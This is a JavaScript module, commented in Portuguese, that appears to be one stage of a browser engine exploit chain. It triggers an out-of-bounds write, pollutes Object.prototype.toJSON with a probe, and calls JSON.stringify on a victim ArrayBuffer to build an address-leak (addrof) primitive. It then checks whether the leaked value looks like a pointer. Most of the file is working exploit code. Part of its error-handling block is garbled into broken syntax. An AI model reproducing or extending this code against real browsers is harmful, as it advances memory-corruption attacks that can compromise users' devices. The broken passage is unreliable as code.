// js/script3/testArrayBufferVictimCrash.mjs (V9 - Sonda Simplificada com Diagnóstico V8)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V9_SimpleProbeDiag";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = {}; // Objeto global para detalhes da sonda
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_probe_check = null;
let probeInvocationCounter = 0;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug com Sonda Simplificada e Diagnóstico V8 ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    probeInvocationCounter = 0;
    toJSON_call_details_v28 = { // Inicializa/reseta o objeto global
        probe_variant: "V9_SimpleProbeDiag",
        invocations: [],
        final_type_observed_on_victim: "N/A", // Tipo do victim_ab na última vez que a sonda o viu
        victim_write_attempted: false,      // A escrita no victim_ab foi tentada?
        victim_type_when_write_attempted: "N/A", // Qual era o tipo do victim_ab ao tentar a escrita?
        victim_type_after_write_attempted: "N/A" // E depois?
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_probe_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V9" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v9 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu / não teve efeito."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100); // Pausa original

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_probe_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_probe_check.fill(fill_pattern_v9);
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_ref_for_probe_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function ProbeCoreExploit_V9_toJSON() {
                    probeInvocationCounter++;
                    const invocationId = probeInvocationCounter;
                    const is_victim = (this === victim_ab_ref_for_original_test);
                    const initial_type = Object.prototype.toString.call(this);
                    let attempted_write = false;
                    let type_after_write = "N/A";
                    let error_msg = null;

                    logS3(`[Probe_V9 Inv#${invocationId}] Entrou. 'this' é vítima: ${is_victim}. Tipo inicial: ${initial_type}`, "leak");

                    if (is_victim && object_to_leak_for_addrof_attempt) {
                        toJSON_call_details_v28.victim_type_when_write_attempted = initial_type;
                        logS3(`[Probe_V9 Inv#${invocationId}] Tentando escrita de addrof em victim_ab (Tipo inicial: ${initial_type})...`, "warn");
                        try {
                            this[0] = object_to_leak_for_addrof_attempt;
                            attempted_write = true;
                            toJSON_call_details_v28.victim_write_attempted = true;
                            logS3(`[Probe_V9 Inv#${invocationId}] Escrita em victim_ab (supostamente) realizada.`, "info");
                        } catch (e_write) {
                            error_msg = `WriteAttemptError: ${e_write.name}: ${e_write.message}`;
                            logS3(`[Probe_V9 Inv#${invocationId}] ERRO durante tentativa de escrita em victim_ab[0]: ${e_write.message}`, "error");
                        }
                        type_after_write = Object.prototype.toString.call(this);
                        toJSON_call_details_v28.victim_type_after_write_attempted = type_after_write;
                        toJSON_call_details_v28.final_type_observed_on_victim = type_after_write; // Atualiza o tipo final do victim
                        logS3(`[Probe_V9 Inv#${invocationId}] Tipo de victim_ab APÓS tentativa de escrita: ${type_after_write}`, "leak");

                        if (attempted_write && type_after_write === '[object Object]') {
                            // Este campo não existe mais no objeto principal, mas é bom logar
                            logS3(`[Probe_V9 Inv#${invocationId}] victim_ab é [object Object] após escrita. Bom sinal!`, "vuln");
                        }
                    }
                    // Adiciona ao array de invocações no objeto global
                    toJSON_call_details_v28.invocations.push({
                        id: invocationId,
                        is_victim_ab: is_victim,
                        this_type_initial: initial_type,
                        attempted_write_on_this: attempted_write,
                        this_type_after_write: type_after_write,
                        error_during_write: error_msg
                    });
                    return { probe_V9_invoked: true, inv_id: invocationId, is_victim: is_victim };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V9.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno (da última sonda chamada?): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28 APÓS stringify): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28.victim_write_attempted) {
                logS3("PASSO 3: Verificando float64_view_ref_for_probe_check[0] APÓS JSON.stringify...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_probe_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_ref_for_probe_check[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v9) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita no victim_ab tentada E VALOR DO BUFFER MUDOU sugerindo ponteiro.";
                    if(toJSON_call_details_v28.final_type_observed_on_victim === '[object Object]') addrof_result.message += " Sonda observou [object Object] no victim_ab pós-escrita.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita no victim_ab tentada, mas valor lido do buffer não mudou ou não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v9) < 1e-9) addrof_result.message += " (Buffer não alterado do padrão)";
                    addrof_result.message += ` Tipo final obs no victim_ab pela sonda: ${toJSON_call_details_v28.final_type_observed_on_victim}.`;
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: AddrWrite OK, AddrVal FAIL`;
                }
            } else {
                addrof_result.message = "Escrita no victim_ab não foi marcada como tentada pela sonda.";
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: VictimWrite SKIPPED`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_probe_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
